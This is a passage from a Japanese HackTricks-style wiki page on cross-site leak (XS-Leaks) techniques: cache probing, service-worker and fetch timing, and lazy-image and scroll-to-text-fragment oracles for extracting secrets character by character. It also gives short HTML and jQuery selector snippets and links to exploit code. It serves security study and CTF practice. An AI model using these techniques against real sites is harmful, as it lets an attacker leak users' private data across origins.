- **概要**: fetchリクエストの応答がリダイレクトであるかどうかを確認できます。
- **コード例**:

![](<../images/image (652).png>)

### AbortControllerを使用したFetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: タイミング
- **詳細情報**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **概要**: リソースを読み込もうとし、読み込まれる前に中断します。エラーがトリガーされるかどうかに応じて、リソースがキャッシュされているかどうかがわかります。
- **コード例**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

_**fetch**_ と _**setTimeout**_ を使用して **AbortController** でリソースが**キャッシュされているかどうか**を検出し、特定のリソースをブラウザキャッシュから排除します。さらに、このプロセスは新しいコンテンツをキャッシュせずに行われます。

### スクリプト汚染

- **インクルージョンメソッド**: HTML要素（スクリプト）
- **検出可能な違い**: ページコンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **概要**: **組み込み関数を上書き**し、その引数を読み取ることが可能で、**クロスオリジンのスクリプト**からも（直接読み取ることはできません）、これが**貴重な情報を漏洩する**可能性があります。
- **コード例**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### サービスワーカー <a href="#service-workers" id="service-workers"></a>

- **インクルージョンメソッド**: ポップアップ
- **検出可能な違い**: ページコンテンツ
- **詳細情報**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **概要**: サービスワーカーを使用してウェブの実行時間を測定します。
- **コード例**:

与えられたシナリオでは、攻撃者は自分のドメインの1つ、具体的には "attacker.com" に**サービスワーカー**を登録することから始めます。次に、攻撃者はメインドキュメントからターゲットウェブサイトに新しいウィンドウを開き、**サービスワーカー**にタイマーを開始するよう指示します。新しいウィンドウが読み込みを開始すると、攻撃者は前のステップで取得した参照を**サービスワーカー**によって管理されているページにナビゲートします。

前のステップで開始されたリクエストが到着すると、**サービスワーカー**は**204 (No Content)** ステータスコードで応答し、ナビゲーションプロセスを終了します。この時点で、**サービスワーカー**は前のステップで開始されたタイマーからの測定値を取得します。この測定値は、ナビゲーションプロセスの遅延を引き起こすJavaScriptの持続時間によって影響を受けます。

> [!WARNING]
> 実行タイミングでは、**ネットワーク要因を排除**して**より正確な測定値を取得**することが可能です。たとえば、ページを読み込む前にページで使用されるリソースを読み込むことによってです。

### Fetchタイミング

- **インクルージョンメソッド**: Fetch API
- **検出可能な違い**: タイミング（一般的にはページコンテンツ、ステータスコードによる）
- **詳細情報**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **概要**: リクエストを実行するのにかかる時間を測定するために [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) を使用します。他の時計も使用できます。
- **コード例**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### クロスウィンドウタイミング

- **インクルージョンメソッド**: ポップアップ
- **検出可能な違い**: タイミング（一般的にはページコンテンツ、ステータスコードによる）
- **詳細情報**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **概要**: `window.open` を使用してリクエストを実行するのにかかる時間を測定するために [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) を使用します。他の時計も使用できます。
- **コード例**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

## HTMLまたは再インジェクションを使用して

ここでは、クロスオリジンHTMLから情報を抽出するための技術を見つけることができます。**HTMLコンテンツを注入する**ことができる場合に興味深い技術です。これらの技術は、何らかの理由で**HTMLを注入できるが、JSコードを注入できない**場合に興味深いです。

### ダンギングマークアップ

{{#ref}}
dangling-markup-html-scriptless-injection/
{{#endref}}

### 画像の遅延読み込み

**コンテンツを抽出する**必要があり、**秘密の前にHTMLを追加できる**場合は、**一般的なダンギングマークアップ技術**を確認する必要があります。\
ただし、何らかの理由で**文字ごとに**行う必要がある場合（キャッシュヒットを介して通信する場合など）、このトリックを使用できます。

HTMLの**画像**には、値が**lazy**である "**loading**" 属性があります。この場合、画像はページが読み込まれるときではなく、表示されたときに読み込まれます。
```html
<img src=/something loading=lazy >
```
したがって、あなたができることは、**秘密の前にウェブページを埋めるために大量のジャンク文字**（例えば、**何千もの"W"**）を**追加することです**。または、**`<br><canvas height="1850px"></canvas><br>`のようなものを追加します**。\
例えば、私たちの**インジェクションがフラグの前に現れると**、**画像**は**読み込まれます**が、**フラグの後に現れると**、フラグ + ジャンクが**読み込まれるのを防ぎます**（どれだけのジャンクを置くかは調整が必要です）。これは[**この書き込み**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)で起こったことです。

もう一つのオプションは、**許可されている場合はscroll-to-text-fragmentを使用することです**：

#### Scroll-to-text-fragment

ただし、あなたは**ボットにページにアクセスさせる**必要があります。
```
#:~:text=SECR
```
ウェブページは次のようになります: **`https://victim.com/post.html#:~:text=SECR`**

ここで、post.html には攻撃者のジャンク文字と遅延読み込み画像が含まれ、その後にボットの秘密が追加されます。

このテキストが行うのは、ボットがページ内の `SECR` というテキストを含む任意のテキストにアクセスすることです。そのテキストが秘密であり、**画像のすぐ下にあるため**、**推測された秘密が正しい場合にのみ画像が読み込まれます**。これにより、**秘密を文字ごとに抽出するためのオラクルが得られます**。

これを利用するためのコード例: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### 画像の遅延読み込みに基づく時間

もし**外部画像を読み込むことができない**場合、攻撃者に画像が読み込まれたことを示す別のオプションは、**文字を何度も推測してそれを測定すること**です。画像が読み込まれると、すべてのリクエストは画像が読み込まれない場合よりも長くかかります。これは、[**この書き込みの解決策**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **において使用されたものです**。

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

`jQuery(location.hash)` が使用される場合、**HTML コンテンツが存在するかどうかをタイミングで確認することが可能です**。これは、セレクタ `main[id='site-main']` が一致しない場合、残りの**セレクタ**をチェックする必要がないためです。
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSSインジェクション

{{#ref}}
xs-search/css-injection/
{{#endref}}

## 防御策

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) およびウィキの各セクション [https://xsleaks.dev/](https://xsleaks.dev/) で推奨される緩和策があります。これらの技術から保護する方法についての詳細は、そちらをご覧ください。

## 参考文献

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../banners/hacktricks-training.md}}
